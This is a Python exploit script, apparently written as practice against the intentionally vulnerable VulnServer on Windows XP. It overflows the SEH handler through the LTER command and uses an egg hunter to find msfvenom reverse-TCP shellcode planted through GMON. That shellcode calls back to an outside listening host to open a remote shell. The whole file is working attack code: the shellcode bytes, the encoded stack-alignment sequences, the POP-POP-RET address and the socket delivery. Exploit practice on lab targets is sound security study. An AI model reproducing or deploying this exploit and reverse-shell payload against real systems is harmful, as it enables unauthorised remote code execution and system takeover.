#!/usr/bin/python

# Title     : VulnServer SEH Overflow in LTER + Egg in GMON
# OS        : Windows XP Pro SP3 x86 English
# Name      : Jonathan "Chops" Crosby
# Email     : me@securitychops.com
# Twitter   : @securitychops
# Website   : https://securitychops.com

import socket
import sys
import time

# IP and Port for VulnServer
host = '192.168.31.132'
port = 6666

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.7.17 LPORT=4444 -f c -b '\x00'
revshell = (
# our egg
"T00WT00W"

# realign the stack back to ending in a zero so it wont crash
"\x83\xEC\x02"

# nopsled for decoding if needed
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# our reverse shell
"\xbf\xaf\x1c\x0d\x7d\xd9\xe8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x4f\x31\x7d\x14\x83\xc5\x04\x03\x7d\x10\x4d\xe9\xf1\x95\x18"
"\x12\x0a\x66\x7a\x9a\xef\x57\xa8\xf8\x64\xc5\x7c\x8a\x29\xe6"
"\xf7\xde\xd9\x7d\x75\xf7\xee\x36\x33\x21\xc0\xc7\xf2\xed\x8e"
"\x04\x95\x91\xcc\x58\x75\xab\x1e\xad\x74\xec\x43\x5e\x24\xa5"
"\x08\xcd\xd8\xc2\x4d\xce\xd9\x04\xda\x6e\xa1\x21\x1d\x1a\x1b"
"\x2b\x4e\xb3\x10\x63\x76\xbf\x7e\x54\x87\x6c\x9d\xa8\xce\x19"
"\x55\x5a\xd1\xcb\xa4\xa3\xe3\x33\x6a\x9a\xcb\xb9\x73\xda\xec"
"\x21\x06\x10\x0f\xdf\x10\xe3\x6d\x3b\x95\xf6\xd6\xc8\x0d\xd3"
"\xe7\x1d\xcb\x90\xe4\xea\x98\xff\xe8\xed\x4d\x74\x14\x65\x70"
"\x5b\x9c\x3d\x56\x7f\xc4\xe6\xf7\x26\xa0\x49\x08\x38\x0c\x35"
"\xac\x32\xbf\x22\xd6\x18\xa8\x87\xe4\xa2\x28\x80\x7f\xd0\x1a"
"\x0f\x2b\x7e\x17\xd8\xf5\x79\x58\xf3\x41\x15\xa7\xfc\xb1\x3f"
"\x6c\xa8\xe1\x57\x45\xd1\x6a\xa8\x6a\x04\x3c\xf8\xc4\xf7\xfc"
"\xa8\xa4\xa7\x94\xa2\x2a\x97\x84\xcc\xe0\xae\x83\x5b\x01\xb1"
"\x0c\x8d\x7d\xb3\x12\xbc\x21\x3a\xf4\xd4\xc9\x6a\xaf\x40\x73"
"\x37\x3b\xf0\x7c\xed\xab\x91\xef\x6a\x2b\xdf\x13\x25\x7c\x88"
"\xe2\x3c\xe8\x24\x5c\x97\x0e\xb5\x38\xd0\x8a\x62\xf9\xdf\x13"
"\xe6\x45\xc4\x03\x3e\x45\x40\x77\xee\x10\x1e\x21\x48\xcb\xd0"
"\x9b\x02\xa0\xba\x4b\xd2\x8a\x7c\x0d\xdb\xc6\x0a\xf1\x6a\xbf"
"\x4a\x0e\x42\x57\x5b\x77\xbe\xc7\xa4\xa2\x7a\xf7\xee\xee\x2b"
"\x90\xb6\x7b\x6e\xfd\x48\x56\xad\xf8\xca\x52\x4e\xff\xd3\x17"
"\x4b\xbb\x53\xc4\x21\xd4\x31\xea\x96\xd5\x13"
)

# starting off the payload witrh LTER
payload = "LTER /.:/"

# SEH Overwrite happens at: 6D45366D = 3499
# found a pop,pop,ret in essfunc.dll
# which is loaded in an address space
# without any null chars :)

# 6250195E   5F               POP EDI
# 6250195F   5D               POP EBP
# 62501960   C3               RETN

pop_pop_ret = "\x5E\x19\x50\x62"

# badchars EB, 80, 79, FF, E0 :(

# FF is registering as 80 ... for reasons? :/

# jump backwards ...FF registers as 80 ...
jmp_back80   = "\x41\x41\x75\xFF"
jmpforward08 = "\x40\x75\x08\x75"
jmpforward07 = "\x40\x75\x07\x75"
jmpforward06 = "\x40\x75\x06\x75"
jmpforward05 = "\x40\x75\x05\x75"

# stack alignment
pop_esp     = "\x5c"
pop_eax     = "\x58"
push_eax    = "\x50"
push_esp    = "\x54"
align_stack = (
"\x2D\x70\x70\x70\x70"  
"\x2D\x05\x70\x70\x70"
"\x2D\x05\x0E\x1F\x1F"
)
zero_eax    = (
"\x25\x7e\x7e\x05\x7e"
"\x25\x01\x01\x7a\x01"
)

# egg hunter to search for T00WT00W
egg_hunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x31\xdb\x43\x43\x53\x58\xcd\x2e"
"\x3c\x05\x5a\x74\xec\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xe7"
"\xaf\x75\xe4\xff\xe7"
)

# setting up all the things
payload += "\x41" * (3499 - len(jmp_back80) - 128 - 128 - 128)

#section n
payload += "A" * (10)

# ok, lets start working stuff here ... we have 126 bytesish ... 
payload += zero_eax
payload += push_esp + pop_eax  # push esp, pop eax
payload += align_stack
payload += push_eax
payload += pop_esp

# first section into the stack
# e7 ff e4 75
# good 
payload += zero_eax 
payload += "\x2D\x70\x10\x71\x10"  
payload += "\x2D\x15\x05\x70\x05"
payload += "\x2D\x06\x06\x1F\x02"
payload += push_eax

# second section into the stack
# af e7 75 af
# good
payload += zero_eax 
payload += "\x2D\x30\x50\x10\x30"  
payload += "\x2D\x20\x20\x04\x10"
payload += "\x2D\x01\x1A\x04\x10"
payload += push_eax

# third section into the stack
# d7 89 57 30
# good
payload += zero_eax 
payload += "\x2D\x20\x70\x50\x10"  
payload += "\x2D\x50\x30\x10\x10"
payload += "\x2D\x60\x08\x16\x08"
payload += push_eax

payload += "A" * (
	   128 
	   - 10
	   # aligning the stack
	   - len(zero_eax) 
	   - len(push_esp) 
	   - len(pop_eax) 
	   - len(align_stack) 
	   - len(push_eax) 
	   - len(pop_esp) 

	   # first set of bytes going onto the stack
	   - len(zero_eax)
	   - 15 
	   - len(push_eax)

	   # second set of bytes going onto the stack
	   - len(zero_eax)
	   - 15
	   - len(push_eax)

	   # third set of bytes going onto the stack
	   - len(zero_eax)
	   - 15
	   - len(push_eax)	
)

# section n
payload += jmpforward07
payload += "A" * 2
payload += jmp_back80

# fourth section into the stack part two
# 30 54 b8 ec
# fourth section into the stack part one
payload += zero_eax 
payload += "\x2D\x10\x40\x70\x70"  
payload += "\x2D\x02\x05\x25\x58"
payload += "\x2D\x02\x02\x16\x07"
payload += push_eax

# fifth section into the stack
# 74 5a 05 3c
# good
payload += zero_eax 
payload += "\x2D\x50\x70\x70\x70"  
payload += "\x2D\x70\x70\x30\x15"
payload += "\x2D\x04\x1A\x05\x06"
payload += push_eax

# sixth section into the stack
# 2e cd 58 53
# good 
payload += zero_eax 
payload += "\x2D\x70\x70\x30\x70"  
payload += "\x2D\x35\x30\x01\x60"
payload += "\x2D\x08\x07\x01\x01"
payload += push_eax

# seventh section into the stack
# 43 43 db 31
# good
payload += zero_eax 
payload += "\x2D\x70\x20\x70\x70"  
payload += "\x2D\x58\x02\x44\x44"
payload += "\x2D\x07\x02\x08\x08"
payload += push_eax

payload += "A" * (
            128 
            - 6 
            # part one of fourth set of bytes going onto the stack
	    - len(zero_eax)		
	
	    # part two of fourth sec of bytes going onto the stack
	    - 15
	    - len(push_eax)
	
	    # fifth set of bytes going onto the stack
	    - len(zero_eax)
	    - 15
	    - len(push_eax)
	
	    # sixth set of bytes going onto the stack
	    - len(zero_eax)
	    - 15
	    - len(push_eax)

	    # seventh set of bytes going onto the stack
	    - len(zero_eax)
	    - 15
	    - len(push_eax)	
            - len(jmp_back80)
)

# last section
payload += jmpforward05
payload += jmp_back80

# eighth section into the stack part two
# 52 42 0f ff
# good
# eighth section into the stack part one
payload += zero_eax 
payload += "\x2d\x65\x65\x75\x75"
payload += "\x2d\x65\x65\x25\x25"
payload += "\x2d\x37\x25\x23\x13"
payload += push_eax

# ninth section into the stack
# ca 81 66 43
# good
payload += zero_eax 
payload += "\x2D\x70\x60\x70\x30"  
payload += "\x2D\x45\x30\x05\x03"
payload += "\x2D\x08\x09\x09\x02"
payload += push_eax


payload += "A" * (
           128 
           - 4 

           # eighth set of bytes going onto the stack
	   # eighth section
	   - len(zero_eax)
	   - 15
	   - len(push_eax)	
	
	   # ninth set of bytes going onto the stack
	   - len(zero_eax)
	   - 15
	   - len(push_eax)
           - len(jmp_back80)
)

# bottom
payload += jmp_back80
payload += pop_pop_ret
payload += "\x41" * (5052 - 3499 - len(pop_pop_ret))
payload += "\x0a"

# this will get our little egg into memory into one thread without errors...

print "[*] sending reverse shell shellcode"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.recv(4096)
egg = "GMON "
egg += revshell
egg += "\x0a"
s.send(egg)
s.recv(4096)
s.close()

print "[*] sleeping two seconds"
time.sleep(2)

print "[*] sending exploit now"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.recv(4096)
s.send(payload)

print "[*] reverse shell should be connected shortly ..."
